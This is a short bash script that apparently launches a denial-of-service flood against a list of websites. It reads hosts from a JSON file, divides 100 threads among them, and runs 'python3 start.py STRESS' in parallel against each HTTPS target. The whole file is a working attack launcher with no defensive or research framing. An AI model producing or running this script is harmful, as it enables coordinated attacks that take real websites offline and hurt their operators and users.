#!/bin/bash

maxThreads=100

hosts=$(cat ./$1 | jq "[ . | to_entries[] | select(.value) | .value ] | unique " | jq -c ".[]")
hostsCount=$(echo $hosts | jq -cRs 'split(" " )' | jq length )
threadsCount=$(( maxThreads / hostsCount ))
runner=""

for host in ${hosts[@]}; do
        if [ -z "$runner" ]; then
                runner="python3 start.py STRESS https://${host:1:-1} 0 $threadsCount 0 0 $2"
        else
                runner="${runner} & python3 start.py STRESS https://${host:1:-1} 0 $threadsCount 0 0 $2"
        fi

done
runner="${runner} && fg"

$($runner)
